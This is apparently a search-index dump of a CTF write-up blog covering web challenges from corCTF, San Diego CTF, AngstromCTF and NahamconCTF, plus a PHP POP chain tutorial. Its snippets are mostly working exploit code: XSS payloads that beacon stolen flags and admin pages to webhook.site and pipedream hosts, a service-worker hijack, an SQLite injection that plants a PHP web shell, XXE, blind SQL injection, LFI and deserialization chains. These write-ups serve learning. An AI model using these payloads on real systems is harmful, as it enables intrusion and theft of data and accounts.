AgPC91bD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIgY2FyZCBiZy1zZWNvbmRhcnkgbXQtNSBwLTAiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48aDMgY2xhc3M9Im0tMCI+Q29tbWVudDwvaDM+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC10ZXh0Ij5FbnRlciB5b3VyIGNvbW1lbnQgYmVsb3c6PC9kaXY+CiAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSJodHRwczovL2VueDRraGg0bTZqeS54LnBpcGVkcmVhbS5uZXQvIj4KICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJoaWRkZW4iIG5hbWU9ImlkIiB2YWx1ZT0iNzIxM2Y1NTQtMmI5OC00MjJhLTg0MTYtN2E0NWQ2YzcxNmJlIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIG10LTMiPgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC10ZXh0Ij5Db21tZW50PC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJ0ZXh0IiByb3dzPTMgbWF4bGVuZ3RoPTE1MD48L3RleHRhcmVhPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJfY3NyZiIgdmFsdWU9IlFhSlZwUmV4LVl4M1VoVlJEQ0hXS1Q4R2dKd2c4UDlIa1JBTSI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgbXQtMyBmbG9hdC1lbmQiIHR5cGU9InN1Ym1pdCI+Q29tbWVudDwvYnV0dG9uPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2Jvb3RzdHJhcC9qcy9ib290c3RyYXAubWluLmpzIj48L3NjcmAgKyBgaXB0PgogICAgPHNjcmlwdCBzcmM9Ii9hc3NldHMvanMvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JgICsgYGlwdD4KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2pzL3NjcmlwdC5qcyI+PC9zY3JgICsgYGlwdD4KPC9ib2R5Pgo8L2h0bWw+CiAgICAgICAgYF0sIHsgdHlwZTogJ3RleHQvaHRtbCcgfSkpKTsKICAgIH0KICAgIHJldHVybjsKfSk7&quot;).then(r =&amp;gt; r.blob()).then(async b =&amp;gt; { let formData = new FormData(); formData.append(&quot;blob&quot;, b, &quot;sw.js&quot;); let pfp = await (await fetch(&quot;/profile&quot;)).text(); let csrf = /\\?_csrf=(.*?)&quot;/.exec(pfp)[1]; let response = await fetch(&quot;/api/upload/?_csrf=&quot; + encodeURIComponent(csrf), { method: &#39;POST&#39;, body: formData }); navigator.sendBeacon(&quot;https://enx4khh4m6jy.x.pipedream.net/&quot;, new URLSearchParams(new URL(response.url).search).get(&quot;message&quot;)); }); }; let stage2 = (SW_FILEID) =&amp;gt; { navigator.serviceWorker.register(`https://blogme.be.ax/api/file?id=${SW_FILEID}`, { scope: &#39;/api/comment&#39; }); }; window.name = &quot;(&quot; + stage1.toString() + `)(&quot;${SW_FILEID}&quot;);`; location.href = `https://blogme.be.ax/post/${EVAL_POSTID}`; &amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Tài liệu tham khảohttps://www.akamai.com/blog/security/abusing-the-service-workers-apihttps://betterprogramming.pub/man-in-the-middle-attacks-via-javascript-service-workers-52647ac929a2https://brycec.me/posts/corctf_2021_challenges#blogme" }, { "title": "San Diego CTF 2022", "url": "/posts/sandiegoctf2022/", "categories": "WebSec, CTF", "tags": "LFI", "date": "2022-05-09 22:07:00 +0700", "snippet": "Sollution của 4 bài web.Apollo 1337Bài này chỉ để làm quen với các tool nên coi hết video của họ là solve được sdctf{0ne_GiANT_L3AP_4_tH3_NeXT_gENERa7i0n}Lots of LogsHướng đi của bài này là bruteforce các log file theo dạng https://logs.sdc.tf/logs/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&amp;lt;date&amp;gt;/&amp;lt;weekday&amp;gt;.logscript exploit:from datetime import datetimeimport requestsTARGET = &quot;https://logs.sdc.tf/logs/&quot;found = Falsefor year in range (2018, 2019): for month in range (1,12): for date in range (1,31): try: current = datetime(year,month, date).strftime(&quot;%A&quot;)[0:3] r = requests.get(TARGET + f&quot;{year}/{month}/{date}/{current}.log&quot;) if &quot;sdc&quot; in r.text: print(&quot;[-] Found with url: &quot; + TARGET + f&quot;{year}/{month}/{date}/{current}.log&quot;) quit() except: pass sdctf{b3tr4y3d_by_th3_l0gs_8a4dfd}JaWT that down!Bài này khó ở chỗ jwt chỉ có giá trị trong một khoảng thời gian ngắn (trường exp) nên cách giải quyết sẽ là re-login sau mỗi request. Mỗi response trả về tương ứng sẽ tướng ứng với từng kí tự tiếp theo của flag.script exploit:import requestss = requests.Session()TARGET = &quot;https://jawt.sdc.tf/&quot;cre = {&quot;username&quot;: &quot;AzureDiamond&quot;, &quot;password&quot;: &quot;hunter2&quot;}url = TARGET + &quot;s&quot;flag = &quot;s&quot; while True: s = requests.Session() r = s.post(TARGET + &#39;login&#39;, data=cre) r = s.get(url) if r.status_code != 200: break url += &#39;/&#39; + r.text flag += r.text print(flag)print(f&quot;[-]Flag: {flag}&quot;) sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3ms_adf3d}CURL Up and ReadServer cho một ô để nhập url, sau đó hiển thị response nhận được từ url này cho user. Hướng đi của bài là khai thác lỗi LFI bằng payload: file:///proc/&amp;lt;id&amp;gt;/environ. Ở đây curl command sẽ chạy trong process con do hàm execFileSync nên việc ta cần làm là bruteforce process id của process cha và grep flag.from base64 import b64encodeimport requestsTARGET = &quot;https://curl.sdc.tf&quot;for i in range (1000): print(f&quot;[-] Trying {i}&quot;) data = &#39;{&quot;url&quot;: &quot;file:///proc/ID/environ&quot;}&#39;.replace(&#39;ID&#39;, i) data_base64 = b64encode(data.encode()).decode() r = requests.get(TARGET + &quot;/read/&quot; + data_base64) if &quot;Internal Server Error&quot; not in r.text: if &quot;sdctf&quot; in r.text: print(&quot;[-] Found: &quot; + TARGET + &quot;/read/&quot; + data_base64) break sdctf{CURL_up_aNd_L0c@L_F1le_incLuSi0N}" }, { "title": "AngstromCTF 2022", "url": "/posts/angstromctf2022/", "categories": "WebSec, CTF", "tags": "xss, sqli, rce, xs-leak, cookie bomb, cache probing", "date": "2022-05-02 22:25:00 +0700", "snippet": "My solution for some web challenges in this competitionThe FlashUse DOM breakpoints in Chrome devtools, right click on p tag and chose Break on -&amp;gt; subtree modifications then step over to get flag actf{sp33dy_l1ke_th3_fl4sh}Auth Skipset cookie: user=admin actf{passwordless_authentication_is_the_new_hip_thing}crumbsexploit script:import requestsimport reTARGET = &quot;https://crumbs.web.actf.co/&quot;s = requests.Session()next = &quot;&quot;for i in range(1002): r = s.get(TARGET + next) if i == 1001: print(r.text) break next = re.search(r&quot;Go to (.*)&quot;, r.text).group(1) print(next) actf{w4ke_up_to_th3_m0on_6bdc10d7c6d5}Xtra Salty SardinesPay attention to the flowing lines:const name = req.body.name .replace(&quot;&amp;amp;&quot;, &quot;&amp;amp;amp;&quot;) .replace(&#39;&quot;&#39;, &quot;&amp;amp;quot;&quot;) .replace(&quot;&#39;&quot;, &quot;&amp;amp;apos;&quot;) .replace(&quot;&amp;lt;&quot;, &quot;&amp;amp;lt;&quot;) .replace(&quot;&amp;gt;&quot;, &quot;&amp;amp;gt;&quot;);I abuse that: The replace() method returns a new string with some or all matches of a pattern replaced by a replacement. The pattern can be a string or a RegExp, and the replacement can be a string or a function called for each match. If pattern is a string, only the first occurrence will be replaced.Payload:&#39;&amp;lt;&amp;gt;&amp;lt;/h1&amp;gt;&amp;lt;script&amp;gt;var x = new XMLHttpRequest;x = open(&#39;GET&#39;, &#39;/flag&#39;); x.onload = function() {navigator.sendBeacon(&#39;https://webhook.site/8771a7aa-4464-438a-84ac-7311eae5bd87&#39;, this.responseText)}; x.send();&amp;lt;/script&amp;gt; actf{those_sardines_are_yummy_yummy_in_my_tummy}School unblockerUse this.Exploit script:const express = require(&#39;express&#39;)const app = express();const port = Number(process.env.PORT) || 8888;app.post(&quot;/&quot;, (req, res) =&amp;gt; { res.redirect(307, &quot;http://127.0.0.1:8080/flag&quot;)});app.listen(port, () =&amp;gt; { console.log(`Server listening on port ${port}`);}); actf{dont_authenticate_via_ip_please}Art GalleryLFI in member parameter. Noted that /proc/1/cwd/ point to the current working directory in the docker container.Send the following payload to fetch Dockerfile.https://art-gallery.web.actf.co/gallery/?member=../../../../proc/1/cwd/DockerfileDockerfile:FROM node:17-bullseye-slimWORKDIR /appCOPY . .RUN mv git .gitRUN npm ciENV PORT=8080EXPOSE 8080CMD [&quot;node&quot;, &quot;index.js&quot;]The next step is to exploit the .git folder using GitHacker.After fetching all sources, use git log to check log commit.┌─[nguyen@parrot]─[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]└──╼ $git logcommit 1c584170fb33ae17a63e22456f19601efb1f23db (HEAD, origin/master, origin/HEAD, master)Author: imposter &amp;lt;sus@aplet.me&amp;gt;Date: Tue Apr 26 21:47:45 2022 -0400 bury secretscommit 713a4aba8af38c9507ced6ea41f602b105ca4101Author: imposter &amp;lt;sus@aplet.me&amp;gt;Date: Tue Apr 26 21:44:48 2022 -0400 remove vital secretscommit 56449caeb7973b88f20d67b4c343cbb895aa6bc7Author: imposter &amp;lt;sus@aplet.me&amp;gt;Date: Tue Apr 26 21:44:01 2022 -0400 add programgit checkout to check a commit.─[✗]─[nguyen@parrot]─[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]└──╼ $git checkout 56449caeb7973b88f20d67b4c343cbb895aa6bc7Previous HEAD position was 1c58417 bury secretsHEAD is now at 56449ca add program┌─[nguyen@parrot]─[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]└──╼ $lserror.html flag.txt images index.html index.js package.json package-lock.json┌─[nguyen@parrot]─[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]└──╼ $cat flag.txt actf{lfi_me_alone_and_git_out_341n4kaf5u59v} actf{lfi_me_alone_and_git_out_341n4kaf5u59v}Secure VaultCreate an account: bla:bla then save the token value (jwt of bla account) after that Delete account. Then set the cookie value with token:&amp;lt;jwt token of bla account&amp;gt; -&amp;gt; return flag.The reason why it works is due to the following two lines in index.js:const user = users.get(res.locals.user.uid);res.type(&quot;text/plain&quot;).send(user.restricted ? user.vault : flag);if we send an old jwt, then user={} and user.restricted=undefined (because it has been already deleted from UserStore). actf{is_this_what_uaf_is}NoFlagsDockerfile:FROM php:8.1.5-apache-bullseyeCOPY printflag /printflagRUN chmod 111 /printflagCOPY src /var/www/htmlRUN chown -R root:root /var/www/html &amp;amp;&amp;amp; chmod -R 555 /var/www/html RUN mkdir /var/www/html/abyss &amp;amp;&amp;amp;\\ chown -R root:root /var/www/html/abyss &amp;amp;&amp;amp;\\ chmod -R 333 abyssEXPOSE 80From this file, i figure out following things: printflag a file with only-executable permission that used to print flag /var/www/html: readable and executable permission /var/www/html/abyss: writable and executable permission=&amp;gt; The target to achieve is RCE using sqlite injection.Read more from here.payload:&#39;);ATTACH DATABASE &#39;/var/www/html/abyss/exp.php&#39; AS exp;CREATE TABLE exp.pwn (dataz text);INSERT INTO exp.pwn (dataz) VALUES (&#39;&amp;lt;?system($_GET[&quot;cmd&quot;]); ?&amp;gt;&#39;);--Result:flagSustenanceI had worked in this challenge for 3 days, searching, trying, playing around with it but i couldn’t come up with a solution. So i will write what i have learned from orther people’s writeups 😗 .Overview:overviewSource:const express = require(&quot;express&quot;);const cookieParser = require(&quot;cookie-parser&quot;);const path = require(&quot;path&quot;);const app = express();app.use(express.urlencoded({ extended: false }));// environment configconst port = Number(process.env.PORT) || 8080;const adminSecret = process.env.ADMIN_SECRET || &quot;secretpw&quot;;const flag = process.env.FLAG || &quot;actf{someone_is_going_to_submit_this_out_of_desperation}&quot;;function queryMiddleware(req, res, next) { res.locals.search = req.cookies.search || &quot;the quick brown fox jumps over the lazy dog&quot;; // admin is a cool kid if (req.cookies.admin === adminSecret) { res.locals.search = flag; } next();}app.use(cookieParser());app.get(&quot;/&quot;, (req, res) =&amp;gt; { res.sendFile(path.join(__dirname, &quot;index.html&quot;));});app.post(&quot;/s&quot;, (req, res) =&amp;gt; { if (req.body.search) { for (const [name, val] of Object.entries(req.body)) { res.cookie(name, val, { httpOnly: true }); } } res.redirect(&quot;/&quot;);});app.get(&quot;/q&quot;, queryMiddleware, (req, res) =&amp;gt; { const query = req.query.q || &quot;h&quot;; // h let status; if (res.locals.search.includes(query)) { status = &quot;succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance&quot;; } else { status = &quot;failed&quot;; } res.redirect( &quot;/?m=&quot; + encodeURIComponent( `your search that took place at ${Date.now()} has ${status}` ) );});app.listen(port, () =&amp;gt; { console.log(`Server listening on port ${port}`);});Working flow: Set search string functionality sets the “search string” and placed it in your cookie. Search string functionality return the status (succeeded/failed) whether the “search string” (stored in cookie) includes the string in q - GET parameter.From those things, we can obviously figure out that it is kind of XS-Leaks challenge.There are 2 approach for solving the challenge: Cookie bomb and Cache probing attack.Cookie bombThe idea and solution came from Strellic and it is also the intended solution.For anyone who don’t know about this attack technique, this blog will be a good reference.We have already known that the server stored the string (if the user is admin, it will be the flag) in cookie and the response’s length in two case is difference (the successful one is longer than another). So if we make the search string very long but controling it to be just barely under the maximum of request header size then we can use the cookie bomb attack to trigger error-event with a view to figuring out whether it was successful or not.But there is still one problem we have to deal with. As you can see, SameSite has not been explicitly specified, the cookie will be treated as SameSite=Lax so that we can’t make the admin bot visit our page and send a lot of cookie because the “Lax” cookie can just be sent by those ways and it have to obey the samesite rule. And @Strellic’s trick solved the problem. He used the XSS vulnerability from Xtra Salty Sardines challenge to exploit. Both https://sustenance.web.actf.co/ and https://xtra-salty-sardines.web.actf.co/ were treated as same site because of having the same eTLD+1 - actf.co.Here is his exploit script:&amp;lt;&amp;gt;&#39;&quot;;&amp;lt;form action=&#39;https://sustenance.web.actf.co/s&#39; method=POST&amp;gt;&amp;lt;input id=f /&amp;gt;&amp;lt;input name=search value=a /&amp;gt;&amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; const $ = document.querySelector.bind(document); const sleep = (ms) =&amp;gt; new Promise(r =&amp;gt; setTimeout(r, ms)); let i = 0; const stuff = async(len = 3500) =&amp;gt; { let name = Math.random(); $(&quot;form&quot;).target = name; let w = window.open(&#39;&#39;, name); $(&quot;#f&quot;).value = &quot;_&quot;.repeat(len); $(&quot;#f&quot;).name = i++; $(&quot;form&quot;).submit(); await sleep(100); }; const isError = async(url) =&amp;gt; { return new Promise(r =&amp;gt; { let script = document.createElement(&#39;script&#39;); script.src = url; script.onload = () =&amp;gt; r(false); script.onerror = () =&amp;gt; r(true); document.head.appendChild(script); }); } const search = (query) =&amp;gt; { return isError(&quot;https://sustenance.web.actf.co/q?q=&quot; + encodeURIComponent(query)); }; const alphabet = &quot;etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ&quot;; const url = &quot;//webhook.site/fe29ff9f-908c-4508-9bbd-14848cf2c3f8&quot;; let known = &quot;actf{&quot;; window.onload = async() =&amp;gt; { navigator.sendBeacon(url + &quot;?load&quot;); await Promise.all([stuff(), stuff(), stuff(), stuff()]); await stuff(1600); navigator.sendBeacon(url + &quot;?go&quot;); while (true) { for (let c of alphabet) { let query = known + c; if (await search(query)) { navigator.sendBeacon(url, query); known += c; break; } } } }; &amp;lt;/script&amp;gt;Promise.all() was used to increase the cookie’s size slowly because sending tons of cookie in one request will get a 502 Bad Gateway status.One thing @Strellic didn’t indicate in his solution is the maximum size of request header. Using Burp Suite i noted that remote server used HTTP/2 module and nginx as web server. After spending a couple of minutes on searching, i came across this site. According to it, the maxium size is 16k in default so we can adjust the len in stuff() to make it barely under the limit.Send payload:payloadResult:resultCache probingAfter reading and trying a lot of exploit techniques in xs-leak wiki, I finally thought about cache probing. But in the end i think it is too complicated so i decide to skip it and wait for the writeup 😔.You can read the original writeup from this and this blog.The idea is to abuse the cache, if the returned response is “succeeded” then it will be cache with the cache key ...?m=your search that took place at &amp;lt;Date.now()&amp;gt; has succed ... require sustenance so we can use fetch with cache: &#39;force-cache&#39; and bruteforce the Date.now() value to measure the response’s time. If the time is small than the “base time” than it is likely that the flag contains the current bruteforcing character.Assuming that cache partitioning workedThere is still one problem we have to come over. Now, Chrome will partition its HTTP cache starting in Chrome 86 (Gaining security and privacy by partitioning the cache). With cache partitioning, cached resources will be keyed using a new “Network Isolation Key” in addition to the resource URL. The Network Isolation Key is composed of the top-level site and the current-frame site.So if you plan to place your exploit script in a page (for example it is hosted by ngrok), the cache key will be (https://id.ngrok.io, https://id.ngrok.io, https://sustenance.web.actf.co/?m=...) but the expected cache key should be (https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =...) in order to make the cache shareable. By using the Strellic’s trick above, we can easily solve the problem. Beside, the cookie attribute is SameSite=Lax (explained above) so we have to use window.open for top-level navigations ortherwise the cookie won’t be sent!&amp;lt;&amp;gt;&quot;&#39;;&amp;lt;script&amp;gt;// to hang the connectionfetch(&#39;https://deelay.me/20000/https://example.com&#39;)// NOTE: we will calculate this baseline before doing the attackvar baseLine = 3.2const sleep = ms =&amp;gt; new Promise((resolve) =&amp;gt; setTimeout(resolve, ms))go()async function go() { await calculateBaseline() main() async function calculateBaseline() { var m = Math.random() let win = window.open(&#39;https://sustenance.web.actf.co/?m=cached_&#39; + m) // NOTE: this number can be decreased by detecting window load await sleep(500) win.close() let total = 0 for(let i=1; i&amp;lt;=5; i++) { let ts = await getLoadTime(&#39;https://sustenance.web.actf.co/?m=cached_&#39; + m) total += ts report(`Cached time, round: ${i}, ${ts}ms`) } // NOTE: 0.5 is just a random guess baseLine = (total/5) + 0.5 report(`Baseline: ${baseLine}`) // NOTE: adjust baseline, should not be more than 3 ms based on previous testing if (baseLine &amp;gt; 3) { baseLine = 3 } for(let i=1; i&amp;lt;=3; i++) { let ts = await getLoadTime(&#39;https://sustenance.web.actf.co/?m=not_cached_&#39; + m) report(`Not Cached time, round: ${i}, ${ts}ms`) } } // NOTE: server is quite fast so no need to set timeout async function getLoadTime(url) { const start = performance.now() await fetch(url, { cache: &#39;force-cache&#39;, mode: &#39;no-cors&#39; }) return performance.now() - start } // function to bruteforce the successful search function genSucceedUrl(t) { let ft = t + &#39;&#39; while(ft.length &amp;lt; 13) { ft += &#39;0&#39; } const status = &quot;succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance&quot;; return &#39;https://sustenance.web.actf.co/?m=&#39; + encodeURIComponent(`your search that took place at ${ft} has ${status}`); } async function isCached(str) { let start = +new Date() let win = window.open(`https://sustenance.web.actf.co/q?q=` + encodeURIComponent(str)) await sleep(500) win.close() // NOTE: base on the data collected, i should be 1~20, pretty small number for(let i=1; i&amp;lt;=30; i++) { const url = genSucceedUrl(start + i) let loadTime = await getLoadTime(url) if (loadTime &amp;lt;= baseLine) { // NOTE: check again to see if it really meets the condition let total = 0 for(let j=1; j&amp;lt;=3; j++) { total += await getLoadTime(url) } total/=3 if (total &amp;lt;= baseLine) { report(`isCached success, str=${str}, i=${i}, start=${start}, total=${total}`) return true } } } return false } async function main() { let flag = &#39;actf{yummy_&#39; // NOTE: we can leak the charset first to speed up the process let chars = &#39;acefsmntuy_}&#39;.split(&#39;&#39;) while(flag[flag.length - 1] !== &#39;}&#39;) { for(let char of chars) { report(&#39;trying:&#39; + flag + char) if (await isCached(flag + char)) { flag += char report(&#39;flag:&#39; + flag) break } } } } async function report(data) { console.log(data) // TODO: change to your VPS return fetch(&#39;https://YOUR_VPS/&#39;, { method: &#39;POST&#39;, body: data, mode: &#39;no-cors&#39; }).catch(err =&amp;gt; err); }}&amp;lt;/script&amp;gt;There is no cache partitioningSome people find out the fact that cache partitioning didn’t work in headless chrome (this one is an example).So you can use the previous script on your page, host it by ngrok and submit this url to admin." }, { "title": "NahamconCTF 2022", "url": "/posts/nahamconctf2022/", "categories": "WebSec, CTF", "tags": "xss, xxe, sqli", "date": "2022-05-01 01:10:00 +0700", "snippet": "Solution for some web challengessolved challengesEXtravagantUpload exp.xml and view it&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;/var/www/flag.txt&quot;&amp;gt; ]&amp;gt;&amp;lt;foo&amp;gt;&amp;amp;xxe;&amp;lt;/foo&amp;gt; flag{639b72f2dd0017f454c44c3863c4e195}Jurassic Parkaccess robots.txtPersonnelexploit script:import requestsimport reTARGET = &quot;http://challenge.nahamcon.com:30349/&quot;r = requests.post(TARGET, data={&quot;name&quot;: &quot;1|(flag.*)|1&quot;, &quot;setting&quot;:0})flag = re.search(r&quot;&amp;lt;li&amp;gt;(flag.*)&amp;lt;/li&amp;gt;&quot;, r.text).group(1)print(&quot;[-] FLAG: &quot; + flag) flag{f0e659b45b507d8633065bbd2832c627}Flaskmetal AlchemistFrom requirements.txt, server uses SQLAlchemy==1.2.17 and it is vulnerable to sqli.exploit script:import requestsimport stringTARGET = &quot;http://challenge.nahamcon.com:30378/&quot;FLAG_LENGTH = 0# Find flag lengthfor i in range(30): order_by_inject = f&quot;(SELECT CASE WHEN ((SELECT LENGTH(flag) from flag) = {i+1}) THEN atomic_number ELSE symbol END)&quot; data = {&quot;search&quot; : &quot;a&quot;, &quot;order&quot;: order_by_inject} r = requests.post(TARGET, data) # with this payload, &quot;aotomic number&quot; column will return &quot;89&quot; before &quot;12&quot; if the WHEN condition is true if r.text.find(&quot;89&amp;lt;/td&amp;gt;&quot;) &amp;gt; r.text.find(&quot;12&amp;lt;/td&amp;gt;&quot;): FLAG_LENGTH = i+1 print(f&quot;[-] Flag length: {FLAG_LENGTH}&quot;) break# Find flagFLAG = &quot;&quot;for i in range(FLAG_LENGTH): for c in string.ascii_lowercase + &quot;_}{&quot;: order_by_inject = f&quot;(SELECT CASE WHEN ((SELECT SUBSTR(flag, {i+1}, 1) from flag) = &#39;{c}&#39;) THEN atomic_number ELSE symbol END)&quot; data = {&quot;search&quot; : &quot;a&quot;, &quot;order&quot;: order_by_inject} r = requests.post(TARGET, data) if r.text.find(&quot;89&amp;lt;/td&amp;gt;&quot;) &amp;gt; r.text.find(&quot;12&amp;lt;/td&amp;gt;&quot;): FLAG += c print(f&quot;[-] Flag: {FLAG}&quot;) break flag{order_by_blind}Hacker TsThe page renders text on t-shirts based on POST text param.x=new XMLHttpRequest;x.onload=function(){x1=new XMLHttpRequest;x1.open(&quot;GET&quot;,&quot;https://webhook.site/f61d8f20-bc48-4ae9-805f-3db7a842363b?c=&quot;%2bencodeURIComponent(btoa(this.responseText)));x1.send();};x.open(&quot;GET&quot;,&quot;http://localhost:5000/admin&quot;);x.send();webhook receives request:resultflagTwo For OneThis is a two factor authentication challenge using password and OTP.The feedback features in Settings page is vulnerable to blind XSSSolve steps: reset 2FA -&amp;gt; reset admin account’s password -&amp;gt; login as admin -&amp;gt; get flagGet new otp auth value var x = new XMLHttpRequest(); x.open(&#39;POST&#39;, &#39;http://challenge.nahamcon.com:32084/reset2fa&#39;); x.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;); x.setRequestHeader(&quot;Accept&quot;, &quot;application/json&quot;); x.onload = function() { navigator.sendBeacon(&#39;https://webhook.site/8771a7aa-4464-438a-84ac-7311eae5bd87&#39;, this.responseText); }; x.send();otp authGenerate new admin’s qr code&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt; &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt; &amp;lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&amp;gt; &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&amp;gt; &amp;lt;title&amp;gt;QR code page&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;div class=&quot;row&quot;&amp;gt; &amp;lt;div class=&quot;col-12&quot;&amp;gt; &amp;lt;canvas id=&quot;qr&quot; style=&quot;margin-right: auto; margin-left: auto;&quot;&amp;gt;&amp;lt;/canvas&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script&amp;gt; var qr = new QRious({ size: 250, element: document.getElementById(&#39;qr&#39;), value: &quot;otpauth://totp/Fort%20Knox:admin?secret=QFBPNXXUIQ6D3LAD&amp;amp;issuer=Fort%20Knox&quot; }); &amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;new admin qr codeReset admin password var x = new XMLHttpRequest(); x.open(&#39;POST&#39;, &#39;http://challenge.nahamcon.com:30223/reset_password&#39;); x.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;); x.setRequestHeader(&quot;Accept&quot;, &quot;application/json&quot;); x.onload = function() { navigator.sendBeacon(&#39;https://webhook.site/8771a7aa-4464-438a-84ac-7311eae5bd87&#39;, this.responseText); }; x.send(JSON.stringify({ otp: &quot;063517&quot;, password: &quot;to^&quot;, password2: &quot;to^&quot; }));Finally, login and view flagflag" }, { "title": "PHP POP Chain", "url": "/posts/phpPopChain/", "categories": "WebSec, CTF", "tags": "pop chain", "date": "2022-04-22 22:27:00 +0700", "snippet": "Ở post này mình sẽ viết về cách khai thác PHP POP Chain mà mình học được qua các bài CTF.PHP POP Chain còn được gọi là Code Reuse Attack là một kĩ thuật hoạt động dựa trên việc sử dụng các đoạn code có sẵn (gadget) và liên kết (chain) chúng lại với nhau để làm thay đổi luồng thực thi của chương trình theo ý muốn của attacker.Thường thì kĩ thuật này sẽ được áp dụng khi một serialized object được đưa vào hàm unserialize() và sử dụng đồng thời các magic methods để chain gadgets lại với nhau.pop chain step1. Ezpop - mrctf2020Link challengehttps://buuoj.cn/challenges#[MRCTF2020]EzpopOverviewoverviewSource&amp;lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-&amp;gt;append($this-&amp;gt;var); }}class Show{ public $source; public $str; public function __construct($file=&#39;index.php&#39;){ $this-&amp;gt;source = $file; echo &#39;Welcome to &#39;.$this-&amp;gt;source.&quot;&amp;lt;br&amp;gt;&quot;; } public function __toString(){ return $this-&amp;gt;str-&amp;gt;source; } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&amp;gt;source)) { echo &quot;hacker&quot;; $this-&amp;gt;source = &quot;index.php&quot;; } }}class Test{ public $p; public function __construct(){ $this-&amp;gt;p = array(); } public function __get($key){ $function = $this-&amp;gt;p; return $function(); }}if(isset($_GET[&#39;pop&#39;])){ @unserialize($_GET[&#39;pop&#39;]);}else{ $a=new Show; highlight_file(__FILE__);}Phân tíchpop get param sẽ được unserialize nếu được gửi đến server. Lướt lên trên ta thấy class Show có khai báo một magic methods là __wakeup -&amp;gt; đây là first gadget. Class Modifier có chứa một method đặc biệt __invoke- “The __invoke() method is called when a script tries to call an object as a function.” -&amp;gt; dùng hàm này để include flag.php -&amp;gt; last gadget.Mình sẽ lợi dụng __toString và __wakeup của class Show. Hàm preg_match sử dụng $this-&amp;gt;source làm tham số thứ 2 vì vậy nếu gán source = new Show() thì sẽ trigger được __toStringTiếp tục hàm __toString gọi đến $this-&amp;gt;str-&amp;gt;source suy ra nếu ta gán str = new Test() thì sẽ tương đương với new Test()-&amp;gt;source -&amp;gt; trigger __get của class Test. Tới đây muốn chain tới gadget cuối thì cần gán p = new Modifier() và ở Modifier gán cho var=&#39;php://filter/convert.base64-encode/resource=flag.php&#39; là xong.Khai thácexploit code:&amp;lt;?phpclass Modifier { protected $var = &#39;php://filter/convert.base64-encode/resource=flag.php&#39;;}class Test{ public $p; public function __construct(){ $this-&amp;gt;p = new Modifier(); }}class Show{ public $source; public $str;}$a = new Show();$a -&amp;gt; source = new Show();$a -&amp;gt; source -&amp;gt; str = new Test();echo urlencode(serialize($a));?&amp;gt;send payloadflag.php flag{9f937575-162d-4d4b-8030-c8859c08ac19}2. EzPOP - EIS2019Link challengehttps://buuoj.cn/challenges#[EIS%202019]EzPOPSource&amp;lt;?phperror_reporting(0);class A { protected $store; protected $key; protected $expire; public function __construct($store, $key = &#39;flysystem&#39;, $expire = null) { $this-&amp;gt;key = $key; $this-&amp;gt;store = $store; $this-&amp;gt;expire = $expire; } public function cleanContents(array $contents) { $cachedProperties = array_flip([ &#39;path&#39;, 